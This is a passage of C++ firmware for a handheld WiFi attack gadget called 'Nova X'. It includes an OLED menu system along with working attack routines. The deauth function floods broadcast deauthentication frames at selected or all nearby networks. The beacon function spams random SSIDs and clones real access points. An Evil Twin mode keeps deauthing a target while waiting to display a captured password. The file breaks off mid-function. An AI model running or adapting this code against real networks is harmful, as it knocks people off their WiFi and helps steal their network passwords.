
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <cmath>
#include "LOGO.h"
//#include "ESP.h"
#include "WebUI.h"
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
int scrollindex = 0;
std::vector<String> Settings = {"Per Deauth","Per Becaon","Max Clone","Max Spam"};
bool toggle_ok = false;
bool becaon_break_flag = false;
// SETTINGS
int frames_per_becaon = 3;
int max_clone = 3;
int max_spam_space = 3;
int selected_menu = 0;
std::vector<String> at_names;
std::vector<String> main_names;
std::vector<String> becaon_names = {"Spam","Clone"};
std::vector<int> SelectedItem;
int fy = 0;
bool init_draw_menu_flag = false;
int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
int selected_settings = 0;
String generateRandomString(int len){
  String randstr = "";
  const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (int i = 0; i < len; i++){
    int index = random(0,strlen(setchar));
    randstr += setchar[index];

  }
  return randstr;
}
char randomString[19];

void drawProgressBar(int x, int y, int width, int height, int progress){
  display.drawRect(x, y, width, height, WHITE);
  int fill = (progress * (width - 2)) / 100;
  display.fillRect(x + 1, y + 1, fill, height - 2, WHITE);
}
void drawBorders() {
    display.drawLine(25, 0, 55, 0, WHITE);
    display.drawLine(73, 0, 103, 0, WHITE);
    display.drawLine(25, 63, 55, 63, WHITE);
    display.drawLine(73, 63, 103, 63, WHITE);
}
void drawScrollbar(int selected, int menuSize, int maxVis, int lineH, int scrollBarW) {
    if (menuSize > maxVis) {
        int scrollBarH = (maxVis * lineH) * maxVis / menuSize;
        int scrollBarY = (selected * (maxVis * lineH - scrollBarH)) / (menuSize - 1);
        display.drawRect(128 - scrollBarW - 1, 3, scrollBarW, maxVis * lineH, WHITE);
        display.fillRect(128 - scrollBarW, scrollBarY + 3, scrollBarW - 1, scrollBarH, WHITE);
    }
}
void drawNavHints(int menuSize) {
  return;
}
int scanNetworks(String text) {

  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...\n");

  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    unsigned long start = millis();
    const unsigned long scanTime = 10000;
    int lastDots = -1;
    if(text == "Scanning"){
      while (millis() - start < scanTime) {
        int dotCount = ((millis() - start) / 500) % 4;
        display.clearDisplay();
        display.drawRoundRect(0, 0, 128, 16, 4, SSD1306_WHITE);
        display.setTextSize(1);
        display.setTextColor(SSD1306_WHITE);
        display.setCursor(6, 3);
        display.println("Nova X");
        display.drawFastHLine(0, 17, 128, SSD1306_WHITE);
        display.drawFastHLine(0, 55, 128, SSD1306_WHITE);
        display.setCursor(10, 30);
        display.print(text);
        for (int i = 0; i < 4; i++) {
          display.print(i <= dotCount ? '.' : ' ');
        }
        display.display();
        delay(50);
      }
    }
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    display.setCursor(0, 32);
    display.println("Scan failed!");
    display.display();
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

//매뉴 값 렌더링
void renderText(const std::vector<String>& menu_name, int start, int fy, int renderCount, int lineH, int textHeight, int menuSize, int maxVis) {
    for (int idx = start; idx < menu_name.size() && idx < start + renderCount; idx++) {
        if (fy >= -lineH && fy < 64) { // 화면 내에서만 렌더링
            int textWidth = menu_name[idx].length() * 6;
            int rectWidth = textWidth + 10;
            int maxWidth = (menuSize > maxVis) ? 118 : 118;
            if (rectWidth < 40) rectWidth = 40;
            if (rectWidth > maxWidth) rectWidth = maxWidth;
            int rectX = (maxWidth - rectWidth) / 2 + 5;
            
            display.setTextColor(SSD1306_WHITE);
            int textX = rectX + (rectWidth - textWidth) / 2; // 수평 중앙
            int textY = fy + (lineH - textHeight) / 2;       // 수직 중앙
            display.setCursor(textX, textY);
            display.println(menu_name[idx]);
        }
        fy += lineH;
    }
}


void renderRoundRect(int rectX, int rectY, int rectWidth, int lineH, int cornerRadius) {
    display.drawRoundRect(rectX, rectY, rectWidth, lineH, cornerRadius, WHITE);
    display.drawRoundRect(rectX + 1, rectY + 1, rectWidth - 2, lineH - 2, cornerRadius - 1, WHITE);
}
static int prev_selected = -1;
void draw_menu(std::vector<String>& menu_name, int selected) {
    //prev_selected = -1;
    static std::vector<String> prev_menu_name;
    const int lineHeight            = 15;
    const int maxVisibleItems       = 4;
    const int cornerRadius          = 5;
    const int scrollBarWidth        = 3;
    const int textHeight            = 8;
    const int charWidth             = 6;
    const int minRectWidth          = 40;
    const int baseX                 = 5;
    const int textOffsetY           = 3;
    const int maxWidthWithScrollbar = 118;
    const int maxWidthNoScrollbar   = 118;
    const unsigned long animDuration = 300UL;
    const unsigned long lineAnimDuration = 250UL;
    const unsigned long lineDelay = 80UL;
    const unsigned long initialAnimTotalDuration = lineAnimDuration + (maxVisibleItems * lineDelay); 
    int menuSize = menu_name.size();
    auto calcStartIndex = [&](int sel) -> int {
        if (menuSize > maxVisibleItems && sel >= maxVisibleItems - 1) {
            int s = sel - (maxVisibleItems - 1);
            return (s + maxVisibleItems > menuSize) ? (menuSize - maxVisibleItems) : s;
        }
        return 0;
    };
    auto calcRectWidth = [&](int textLen) -> int {
        int w = textLen * charWidth + 10;
        int maxW = (menuSize > maxVisibleItems) ? maxWidthWithScrollbar : maxWidthNoScrollbar;
        if (w < minRectWidth) w = minRectWidth;
        if (w > maxW) w = maxW;
        return w;
    };
    bool menu_changed = (menu_name != prev_menu_name);

    if (prev_selected == -1 || menu_changed) {
        unsigned long startTime = millis();
        unsigned long endTime = startTime + initialAnimTotalDuration;
        int finalStartIndex = calcStartIndex(selected);
        int targetTextOffsetY = textOffsetY;
        while (millis() < endTime) {
            unsigned long now = millis();
            display.clearDisplay();
            drawBorders();
            drawScrollbar(selected, menuSize, maxVisibleItems, lineHeight, scrollBarWidth);
            
            for (int i = 0; i < maxVisibleItems && (finalStartIndex + i) < menuSize; ++i) {
                unsigned long lineStartTime = startTime + (i * lineDelay);
                unsigned long lineEndTime = lineStartTime + lineAnimDuration;

                float t = 0.0f;
                if (now >= lineStartTime) {
                    t = float(now - lineStartTime) / float(lineAnimDuration);
                    if (t > 1.0f) t = 1.0f;
                }
                
                float easedT = 1.0f - pow(1.0f - t, 3.0f);

                int startInitialY = (display.height() > 0 ? display.height() : 64) + textOffsetY + (i * lineHeight);
                int currentFy = (int)roundf(startInitialY + (targetTextOffsetY + (i * lineHeight) - startInitialY) * easedT);
                int textWidth = menu_name[finalStartIndex + i].length() * charWidth;
                int rectWidth = textWidth + 10;
                int maxWidth = (menuSize > maxVisibleItems) ? maxWidthWithScrollbar : maxWidthNoScrollbar;
                if (rectWidth < minRectWidth) rectWidth = minRectWidth;
                if (rectWidth > maxWidth) rectWidth = maxWidth;
                int rectX = (maxWidth - rectWidth) / 2 + baseX;
                
                display.setTextColor(SSD1306_WHITE);
                int textX = rectX + (rectWidth - textWidth) / 2;
                int textY = currentFy + (lineHeight - textHeight) / 2;
                display.setCursor(textX, textY);
                display.println(menu_name[finalStartIndex + i]);
            }
            unsigned long selectedLineStartTime = startTime + ((selected - finalStartIndex) * lineDelay);
            unsigned long selectedLineEndTime = selectedLineStartTime + lineAnimDuration;
            float selectedT = 0.0f;
            if (now >= selectedLineStartTime) {
                selectedT = float(now - selectedLineStartTime) / float(lineAnimDuration);
                if (selectedT > 1.0f) selectedT = 1.0f;
            }
            float easedSelectedT = 1.0f - pow(1.0f - selectedT, 3.0f);

            int startSelectedY = (display.height() > 0 ? display.height() : 64) + textOffsetY + ((selected - finalStartIndex) * lineHeight);
            int finalSelectedY = textOffsetY + (selected - finalStartIndex) * lineHeight;
            int currentSelY = (int)roundf(startSelectedY + (finalSelectedY - startSelectedY) * easedSelectedT);

            int textLen = menu_name[selected].length();
            int rectW = calcRectWidth(textLen);
            int maxW = (menuSize > maxVisibleItems) ? maxWidthWithScrollbar : maxWidthNoScrollbar;
            int rectX = (maxW - rectW) / 2 + baseX;
            renderRoundRect(rectX, currentSelY, rectW, lineHeight, cornerRadius);
            
            drawNavHints(menuSize);
            display.display();
        }
        
        prev_menu_name = menu_name;
        prev_selected = selected;
        return;
    }
    // render round rect 

    if (prev_selected == -1 || prev_selected == selected) {
        int startIndex = calcStartIndex(selected);
        int fy = textOffsetY;

        display.clearDisplay();
        drawBorders();
        drawScrollbar(selected, menuSize, maxVisibleItems, lineHeight, scrollBarWidth);
        renderText(menu_name, startIndex, fy, maxVisibleItems, lineHeight, textHeight, menuSize, maxVisibleItems);
        
        for (int i = 0; i < maxVisibleItems && (startIndex + i) < menuSize; ++i) {
            if ((startIndex + i) == selected) {
                int textLen = menu_name[selected].length();
                int rectW = calcRectWidth(textLen);
                int maxW  = (menuSize > maxVisibleItems) ? maxWidthWithScrollbar : maxWidthNoScrollbar;
                int rectX = (maxW - rectW) / 2 + baseX;
                renderRoundRect(rectX, fy + i * lineHeight, rectW, lineHeight, cornerRadius);
            }
        }

        drawNavHints(menuSize);
        display.display();
        prev_selected = selected;
        prev_menu_name = menu_name; 
        return;
    }
    // animate logic
    int prevStart = calcStartIndex(prev_selected);
    int newStart  = calcStartIndex(selected);
    int prevY = textOffsetY + (prev_selected - prevStart) * lineHeight;
    int newY  = textOffsetY + (selected        - newStart)  * lineHeight;
    int prevW = calcRectWidth(menu_name[prev_selected].length());
    int newW  = calcRectWidth(menu_name[selected].length());
    int maxW = (menuSize > maxVisibleItems) ? maxWidthWithScrollbar : maxWidthNoScrollbar;
    int prevX = (maxW - prevW) / 2 + baseX;
    int newX  = (maxW - newW)  / 2 + baseX;

    unsigned long startTime = millis();
    unsigned long endTime   = startTime + animDuration;
    float deltaY = float(newY - prevY);
    float deltaX = float(newX - prevX);
    float deltaW = float(newW - prevW);

    bool done = false;
    while (!done) {
        unsigned long now = millis();
        if (now >= endTime) {
            now = endTime;
            done = true;
        }
        float t = float(now - startTime) / float(animDuration);
        if (t < 0.0f) t = 0.0f;
        if (t > 1.0f) t = 1.0f;
        float easedT = t < 0.5 ? 4 * t * t * t : 1 - pow(-2 * t + 2, 3) / 2;
        float currentYf = float(prevY) + deltaY * easedT;
        float currentXf = float(prevX) + deltaX * easedT;
        float currentWf = float(prevW) + deltaW * easedT;
        int currentY = (int)roundf(currentYf);
        int currentX = (int)roundf(currentXf);
        int currentW = (int)roundf(currentWf);

        float currentStartF = float(prevStart) + float(newStart - prevStart) * easedT;
        int baseIndex = (int)floorf(currentStartF);
        float fractionY = currentStartF - float(baseIndex);
        int textOffsetPixel = (int)roundf(fractionY * lineHeight);
        int fy = textOffsetY - textOffsetPixel;

        display.clearDisplay();
        drawBorders();
        drawScrollbar(selected, menuSize, maxVisibleItems, lineHeight, scrollBarWidth);

        renderText(menu_name, baseIndex, fy, maxVisibleItems + 1, lineHeight, textHeight, menuSize, maxVisibleItems);

        renderRoundRect(currentX, currentY, currentW, lineHeight, cornerRadius);
        drawNavHints(menuSize);
        display.display();
    }

    int finalStart = newStart;
    int fy_final = textOffsetY;

    display.clearDisplay();
    drawBorders();
    drawScrollbar(selected, menuSize, maxVisibleItems, lineHeight, scrollBarWidth);
    renderText(menu_name, finalStart, fy_final, maxVisibleItems, lineHeight, textHeight, menuSize, maxVisibleItems);

    int finalX = newX;
    int finalY = newY;
    int finalW = newW;
    renderRoundRect(finalX, finalY, finalW, lineHeight, cornerRadius);

    drawNavHints(menuSize);
    display.display();

    prev_selected = selected;
    prev_menu_name = menu_name;
}
bool contains(std::vector<int>& vec, int value) {
  for (int v : vec) {
    if (v == value) {
      return true;
    }
  }
  return false;
}
void addValue(std::vector<int>& vec, int value) {
  if (!contains(vec, value)) {
    vec.push_back(value);
  } else {
    Serial.print(value);
    Serial.println("Exits");
    for (auto IT = vec.begin(); IT != vec.end();) {
      if (*IT == value) {
        IT = vec.erase(IT);
      } else {
        ++IT;
      }
    }
    Serial.println("De-selected");
  }
}
void display_init(){
  //display.clearDisplay();
  display.setCursor(0,0);
  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
}
void RuningProgressBar(){
  static unsigned long lastupdate = 0;
  static int progress = 0;
  if(millis()  - lastupdate > 300){
    progress += 5;
    if (progress > 100) {
      progress =0;
      display.fillRect(10, 40, 100, 10, BLACK);  
    }
    lastupdate = millis();
  }
  drawProgressBar(10, 40, 100, 10, progress);
}

void becaon(int state){
  display_init();
  display.clearDisplay();
  display.drawRoundRect(0, 0, 128, 16, 4, WHITE);
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(6, 3);
  display.println("STATE");
  display.drawFastHLine(0, 17, 128, WHITE);
  display.setTextColor(WHITE);
  display.setCursor(4, 22);
  display.println(becaon_names[state]);
  const int cx = 110, cy = 26, r = 5;
  display.fillCircle(cx, cy, r, WHITE);
  display.drawCircle(cx, cy, r, WHITE); 
  display.display();

  while(!becaon_break_flag){
    RuningProgressBar();
    display.display();
    if(ButtonPress(btnBack)) becaon_break_flag = true;
    switch (state) {
      case 0: {
        for(int i=0;i<6;i++){
          byte randomByte = random(0x00, 0xFF);
          snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
        }
        int randomIndex = random(0,19);
        int randomChannel = allChannels[randomIndex];
        wext_set_channel(WLAN0_NAME,randomChannel);      
        String spamssid = generateRandomString(10);
        for (int j = 0; j<max_spam_space; j++){
          spamssid += " ";
          const char * spamssid_cstr = spamssid.c_str();
          for(int x=0;x<frames_per_becaon;x++){
            wifi_tx_beacon_frame(randomString,(void *) "\xFF\xFF\xFF\xFF\xFF\xFF",spamssid_cstr);
          }
        }
        break;
      }
      case 1: {       
        for (int i = 0 ; i < SelectedItem.size(); i++){
          int idx = SelectedItem[i];
          String clonessid = scan_results[idx].ssid;
          memcpy(becaon_bssid,scan_results[idx].bssid,6); 
          wext_set_channel(WLAN0_NAME,scan_results[idx].channel);
          for(int j = 0; j<max_clone; j++){
            clonessid += " ";            
            const char * clonessid_cstr = clonessid.c_str();
            for(int x =0;x<frames_per_becaon;x++) wifi_tx_beacon_frame_Privacy_RSN_IE(becaon_bssid,(void *) "\xFF\xFF\xFF\xFF\xFF\xFF",clonessid_cstr);
          }
        }
        break;
      }
    }
  } 
}

bool deauth_break_flag = false;
void deauth(int SetMode) {
  deauth_channels.clear();
  chs_idx.clear();
  current_ch_idx = 0;
  
  switch (SetMode) {
    case 0: {
      for (int i = 0; i < SelectedItem.size(); i++) {
        int idx = SelectedItem[i];
        int ch = scan_results[idx].channel;
        deauth_channels[ch].push_back(idx);
        if (!contains(chs_idx, ch)) {
          chs_idx.push_back(ch);
        }
      }
      break;
    }
    case 1: { 
      for (int i = 0; i < scan_results.size(); i++) {
        int ch = scan_results[i].channel;
        deauth_channels[ch].push_back(i);
        if (!contains(chs_idx, ch)) {
          chs_idx.push_back(ch);
        }
      }
      break;
    }
  }
  
  isDeauthing = true;
  deauth_break_flag = false;
  while (isDeauthing && !deauth_channels.empty() && !deauth_break_flag) {
    RuningProgressBar();
    display.display();
    if (current_ch_idx < chs_idx.size()) {
      int ch = chs_idx[current_ch_idx];
      wext_set_channel(WLAN0_NAME, ch);
      
      if (deauth_channels.find(ch) != deauth_channels.end()) {
        std::vector<int>& networks = deauth_channels[ch];
        
        for (int i = 0; i < frames_per_deauth; i++) {
          if (ButtonPress(btnBack)) {
            deauth_break_flag = true;
            break;
          }
          
          for (int j = 0; j < networks.size(); j++) {
            int idx = networks[j];
            memcpy(deauth_bssid, scan_results[idx].bssid, 6);
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
            sent_frames++;
          }
          
          delay(send_delay);
        }
      }
      current_ch_idx++;
      if (current_ch_idx >= chs_idx.size()) {
        current_ch_idx = 0;
      }
    }
  }
  
  isDeauthing = false;
  wext_set_channel(WLAN0_NAME, current_channel);
}

void SourApple(){
  //SendToEsp("Sour Apple Mode");
  display_init();
  delay(200);
  //SendToEsp("RUN");
  while(true){
    RuningProgressBar();
    display.display();
    if(ButtonPress(btnBack)) {
      //SendToEsp("Q");
      break;
    }
  }
}

void showPopup(String message, int duration = 1500) {
  int16_t x1, y1;
  uint16_t w, h;
  display.getTextBounds(message, 0, 0, &x1, &y1, &w, &h);

  int boxWidth = w + 10;
  int boxHeight = h + 10;
  int boxX = (SCREEN_WIDTH - boxWidth) / 2;
  int boxY = (SCREEN_HEIGHT - boxHeight) / 2;
  
  display.fillRect(boxX, boxY, boxWidth, boxHeight, SSD1306_BLACK);
  display.drawRect(boxX, boxY, boxWidth, boxHeight, SSD1306_WHITE);

  display.setTextColor(SSD1306_WHITE);
  display.setCursor(boxX + 5, boxY + 5);
  display.print(message);
  display.display();
  
  delay(duration);
}

int SSID_NUM = 0;

int scrollindex2 = 0;

void Evil_Twin() {
  display.setTextColor(SSD1306_WHITE,SSD1306_BLACK);
  String TwinSSID = scan_results[SSID_NUM].ssid;
  TwinSSID = TwinSSID + " ";
  //SendToEsp("Evil Twin Mode");
  delay(100);
  //SendToEsp(TwinSSID);
  delay(100);
  
  display.clearDisplay();
  display.setCursor(0, 0);
  display.println("Evil Twin Active");
  display.println("SSID: " + TwinSSID);
  display.println("Waiting for login...");
  display.println("");
  display.println("BACK: Exit");
  display.display();
  
  String lastCapturedPs = "NONE";
  unsigned long lastCheckTime = 0;
  memcpy(deauth_bssid,scan_results[SSID_NUM].bssid,6);
  wext_set_channel(WLAN0_NAME,scan_results[SSID_NUM].channel);
  while(true) {
    if(ButtonPress(btnBack)) {
      //SendToEsp("Q");
      delay(50);
      break;
    }
    wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF",2);
    unsigned long currentTime = millis();
    if (currentTime - lastCheckTime >= 500) {
      lastCheckTime = currentTime;
      
      String capturedPs = ":<";//RequestToEsp(); 
      
      if (capturedPs != lastCapturedPs) {
        lastCapturedPs = capturedPs;
        
        display.clearDisplay();
        display.setCursor(0, 0);
        display.println("Evil Twin Active");
        display.println("SSID: " + TwinSSID);
        display.println("---------------");
        
        if (capturedPs != "NONE" && capturedPs != "NO RESPONSE") {
          display.println("Captured Password:");
          display.println(capturedPs);
        } else {
          display.println("Waiting for login...");
        }
        
        display.println("");
        display.println("BACK: Exit");
        display.display();
      }
    }
    delay(10);
  }
}
void ET_Selected() {
    display.clearDisplay();
    showPopup("Selecte Target SSID");
    const int lineH = 15;         
    const int maxVis = 4;         
    const int cornerRadius = 5;   
    const int frames = 12;       
    const float step = 1.0 / frames; 
    const int textHeight = 8;     
    static int prev_scrollindex2 = -1; 

    while (true) {
        int pageStart = (scrollindex2 / maxVis) * maxVis;
        int prevPageStart = prev_scrollindex2 == -1 ? pageStart : (prev_scrollindex2 / maxVis) * maxVis;
        bool animate = false;

        if (ButtonPress(btnDown) && scrollindex2 > 0) {
            prev_scrollindex2 = scrollindex2;
            scrollindex2--;
            prevPageStart = (prev_scrollindex2 / maxVis) * maxVis;
            pageStart = (scrollindex2 / maxVis) * maxVis;
            animate = prev_scrollindex2 != -1;
        }
        if (ButtonPress(btnUp) && scrollindex2 < scan_results.size() - 1) {
            prev_scrollindex2 = scrollindex2;
            scrollindex2++;
            prevPageStart = (prev_scrollindex2 / maxVis) * maxVis;
            pageStart = (scrollindex2 / maxVis) * maxVis;
            animate = prev_scrollindex2 != -1;
        }
        if (ButtonPress(btnOk)) {
            SSID_NUM = scrollindex2;
            break;
        }
        if (ButtonPress(btnBack)) {
            break;
        }

        if (animate) {
            int prevY = 3 + (prev_scrollindex2 - prevPageStart) * lineH;
            int targetY = 3 + (scrollindex2 - pageStart) * lineH;
            const int rectWidth = SCREEN_WIDTH; // 화면 전체 너비
            const int rectX = 0; // 왼쪽 정렬

            for (int i = 1; i <= frames; i++) {
                float t = i * step;
                float easedT = 1.0 - (1.0 - t) * (1.0 - t); // Quadratic easing out
                int currentY = prevY + (targetY - prevY) * easedT;

                display.clearDisplay();
                for (int line = 0; line < maxVis; line++) {
                    int idx = pageStart + line;
                    if (idx >= scan_results.size()) break;
                    String ssid = scan_results[idx].ssid;
                    if (ssid.length() == 0) ssid = "#HIDDEN";
                    else if (ssid.length() > 13) ssid = ssid.substring(0, 13) + "...";
                    int fy = 3 + line * lineH;
                    display.setTextColor(SSD1306_WHITE);
                    int textY = fy + (lineH - textHeight) / 2;
                    display.setCursor(5, textY); // 왼쪽 여백 5px
                    display.print(ssid);
                }
                renderRoundRect(rectX, currentY, rectWidth, lineH, cornerRadius);
                display.display();
                delay(4);
            }
        }

        display.clearDisplay();
        const int rectWidth = SCREEN_WIDTH; // 화면 전체 너비
        const int rectX = 0; // 왼쪽 정렬
        for (int line = 0; line < maxVis; line++) {
            int idx = pageStart + line;
            if (idx >= scan_results.size()) break;
            String ssid = scan_results[idx].ssid;
            if (ssid.length() == 0) ssid = "#HIDDEN";
            else if (ssid.length() > 13) ssid = ssid.substring(0, 13) + "...";
            int fy = 3 + line * lineH;
            display.setTextColor(SSD1306_WHITE);
            int textY = fy + (lineH - textHeight) / 2;
            display.setCursor(5, textY); // 왼쪽 여백 5px
            display.print(ssid);
            if (idx == scrollindex2) {
                renderRoundRect(rectX, fy, rectWidth, lineH, cornerRadius);
            }
        }
        display.display();
        
        prev_scrollindex2 = scrollindex2;
    }
}
//세팅 값 렌더링
void renderText(const std::vector<String>& settings, int start, int fy, int renderCount, int lineH, int textHeight, int selected) {
    for (int idx = start; idx < settings.size() && idx < start + renderCount; idx++) {
        if (fy >= -lineH && fy < 64) { // 화면 내에서만 렌더링
            display.setTextColor(SSD1306_WHITE);
            int textX = 10; // 고정된 x 위치
            int textY = fy + (lineH - textHeight) / 2; // 수직 중앙
            display.setCursor(textX, textY);
            display.print(settings[idx]);
            display.setCursor(100, textY); // 오른쪽에 숫자 출력
            if (toggle_ok){
              display.setTextColor(SSD1306_BLACK,SSD1306_WHITE);
            }
            else{
              display.setTextColor(SSD1306_WHITE,SSD1306_BLACK);
            }
            switch (idx) {
                case 0:
                    display.println(frames_per_deauth);
                    break;
                case 1:
                    display.println(frames_per_becaon);
                    break;
                case 2:
                    display.println(max_clone);
                    break;
                case 3:
                    display.println(max_spam_space);
                    break;
            }
        }
        fy += lineH;
    }
}
void Draw_Settings() {
    display_init();
    int prev_selected_settings = selected_settings;
    const int lineH = 15;
    const int textHeight = 8;
    const int frames = 12;
    const int cornerRadius = 5;
    const int rectX = 5; 
    const int rectWidth = 118; 
    while (true) {
        if (ButtonPress(btnBack)) {
            selected_menu = 0; 
            toggle_ok = false;
            break;
        }
        if (ButtonPress(btnOk)) {
            toggle_ok = !toggle_ok;
        }
        if (ButtonPress(btnDown)) {
            if (toggle_ok) {
                switch (selected_settings) {
                    case 0:
                        frames_per_deauth++;
                        break;
                    case 1:
                        frames_per_becaon++;
                        break;
                    case 2:
                        max_clone++;
                        break;
                    case 3:
                        max_spam_space++;
                        break;
                }
            } else {
                if (0 < selected_settings) {
                    prev_selected_settings = selected_settings;
                    selected_settings--;
                    // 애니메이션
                    int prevY = 3 + prev_selected_settings * lineH;
                    int targetY = 3 + selected_settings * lineH;
                    for (int i = 1; i <= frames; i++) {
                        float t = i / (float)frames;
                        float easedT = 1.0 - (1.0 - t) * (1.0 - t); // Quadratic easing out
                        int currentY = prevY + (targetY - prevY) * easedT;
                        display.clearDisplay();
                        renderText(Settings, 0, 3, Settings.size(), lineH, textHeight, selected_settings);
                        renderRoundRect(rectX, currentY, rectWidth, lineH, cornerRadius);
                        display.display();
                        delay(4); // 프레임 간 지연
                    }
                }
            }
        }
        if (ButtonPress(btnUp)) {
            if (toggle_ok) {
                if ((frames_per_becaon > 0) && (frames_per_deauth > 0) && (max_clone > 0) && (max_spam_space > 0)) {
                    switch (selected_settings) {
                        case 0:
                            frames_per_deauth--;
                            break;
                        case 1:
                            frames_per_becaon--;
                            break;
                        case 2:
                            max_clone--;
                            break;
                        case 3:
                            max_spam_space--;
                            break;
                    }
                }
            } else {
                if (selected_settings < Settings.size() - 1) {
                    prev_selected_settings = selected_settings;
                    selected_settings++;
                    // 애니메이션
                    int prevY = 3 + prev_selected_settings * lineH;
                    int targetY = 3 + selected_settings * lineH;
                    for (int i = 1; i <= frames; i++) {
                        float t = i / (float)frames;
                        float easedT = 1.0 - (1.0 - t) * (1.0 - t); // Quadratic easing out
                        int currentY = prevY + (targetY - prevY) * easedT;
                        display.clearDisplay();
                        renderText(Settings, 0, 3, Settings.size(), lineH, textHeight, selected_settings);
                        renderRoundRect(rectX, currentY, rectWidth, lineH, cornerRadius);
                        display.display();
                        delay(4); // 프레임 간 지연
                    }
                }
            }
        }
        display.clearDisplay();
        renderText(Settings, 0, 3, Settings.size(), lineH, textHeight, selected_settings);
        int fy = 3 + selected_settings * lineH;
        renderRoundRect(rectX, fy, rectWidth, lineH, cornerRadius);
        display.display();
    }
}
void AT_draw_func(int state);
void auth_assoc(int state);
void Draw_Selected_Menu() {
    const int lineH = 15;         
    const int maxVis = 4;        
    const int cornerRadius = 5;   
    const int frames = 12;        
    const float step = 1.0 / frames; 
    const int textHeight = 8;     
    const int markWidth = 3 * 6;  
    static int prev_scrollindex = -1; 
    const int scrollBarW = 3;
    int menuSize = scan_results.size();
    while (true) {
        int pageStart = (scrollindex / maxVis) * maxVis;
        int prevPageStart = prev_scrollindex == -1 ? pageStart : (prev_scrollindex / maxVis) * maxVis;
        bool animate = false;

        if (ButtonPress(btnUp) && scrollindex < scan_results.size() - 1) {
            prev_scrollindex = scrollindex;
            scrollindex++;
            prevPageStart = (prev_scrollindex / maxVis) * maxVis;
            pageStart = (scrollindex / maxVis) * maxVis;
            animate = prev_scrollindex != -1;
        }
        if (ButtonPress(btnDown) && scrollindex > 0) {
            prev_scrollindex = scrollindex;
            scrollindex--;
            prevPageStart = (prev_scrollindex / maxVis) * maxVis;
            pageStart = (scrollindex / maxVis) * maxVis;
            animate = prev_scrollindex != -1;
        }
        if (ButtonPress(btnOk)) {
            addValue(SelectedItem, scrollindex);
        }
        if (ButtonPress(btnBack)) {
            selected_menu = 0;
            break;
        }

        if (animate) {
            int prevY = 3 + (prev_scrollindex - prevPageStart) * lineH;
            int targetY = 3 + (scrollindex - pageStart) * lineH;
            const int rectWidth = SCREEN_WIDTH-25; // 화면 전체 너비
            const int rectX = 0; // 왼쪽 정렬

            for (int i = 1; i <= frames; i++) {
                float t = i * step;
                float easedT = 1.0 - (1.0 - t) * (1.0 - t); // Quadratic easing out
                int currentY = prevY + (targetY - prevY) * easedT;

                display.clearDisplay();
                for (int line = 0; line < maxVis; line++) {
                    int idx = pageStart + line;
                    if (idx >= scan_results.size()) break;
                    String ssid = scan_results[idx].ssid;
                    if (ssid.length() == 0) ssid = "#HIDDEN";
                    else if (ssid.length() > 13) ssid = ssid.substring(0, 13) + "...";
                    bool checked = contains(SelectedItem, idx);
                    String mark = checked ? "[*]" : "[ ]";
                    int fy = 3 + line * lineH;
                    display.setTextColor(SSD1306_WHITE);
                    int textY = fy + (lineH - textHeight) / 2;
                    display.setCursor(5, textY); // 왼쪽 여백 5px
                    display.print(ssid);
                    display.setCursor(SCREEN_WIDTH - markWidth - 7, textY); // 오른쪽 여백 8px
                    display.print(mark);
                }
                drawScrollbar(scrollindex,menuSize,maxVis,lineH,scrollBarW);
                renderRoundRect(rectX, currentY, rectWidth, lineH, cornerRadius);
                display.display();
            }
        }

        display.clearDisplay();
        const int rectWidth = SCREEN_WIDTH -25; // 화면 전체 너비 -25 
        const int rectX = 0; // 왼쪽 정렬
        for (int line = 0; line < maxVis; line++) {
            int idx = pageStart + line;
            if (idx >= scan_results.size()) break;
            String ssid = scan_results[idx].ssid;
            if (ssid.length() == 0) ssid = "#HIDDEN";
            else if (ssid.length() > 13) ssid = ssid.substring(0, 13) + "...";
            bool checked = contains(SelectedItem, idx);
            String mark = checked ? "[*]" : "[ ]";
            int fy = 3 + line * lineH;
            display.setTextColor(SSD1306_WHITE);
            int textY = fy + (lineH - textHeight) / 2;
            display.setCursor(5, textY); // 왼쪽 여백 5px
            display.print(ssid);
            display.setCursor(SCREEN_WIDTH - markWidth - 7, textY); // 오른쪽 여백 8px
            display.print(mark);
            if (idx == scrollindex) {
                
                renderRoundRect(rectX, fy, rectWidth, lineH, cornerRadius);
            }
        }
        drawScrollbar(scrollindex,menuSize,maxVis,lineH,scrollBarW);
        display.display();
        
        prev_scrollindex = scrollindex;
    }
}
void selection_handdler(std::vector<String>& menu_name_handle, int menu_func_state) {
  while (true) {
    bool buttonPressed = false;
    //working_check();
    //draw_menu(names,selected_menu);
    if (ButtonPress(btnBack)) {
      Serial.println("BACK");
      if (!menu_func_state == 0) selected_menu = 0;
      break;
    }
    if (ButtonPress(btnOk)) {
      buttonPressed = true;
      switch (menu_func_state) {
        case 0:  //default
          switch (selected_menu) {
            case 0:
              //working_check();
              //Attack Menu Draw Func
              draw_menu(at_names, 0);
              Serial.println("at_names Drawing");
              selection_handdler(at_names, 1);
              Serial.println(menu_func_state);
              draw_menu(menu_name_handle, selected_menu);  // MUST NEED IT
              break;
            case 1:
              if (scanNetworks("Scanning") != 0) {
                while(true) delay(1000);
              }
              
              selected_menu = 0;
              draw_menu(menu_name_handle, selected_menu);
              break;
            case 2:
              Draw_Selected_Menu();
              draw_menu(menu_name_handle, selected_menu);
              break;
            case 3:
              Draw_Settings();
              draw_menu(menu_name_handle, selected_menu);
              break;
          }
          break;
        case 1:
          AT_draw_func(selected_menu);
          display_working = false;
          draw_menu(menu_name_handle,selected_menu);
          break;
        case 2:
          switch(selected_menu){
            case 0:
              if(!becaon_break_flag) becaon(0);
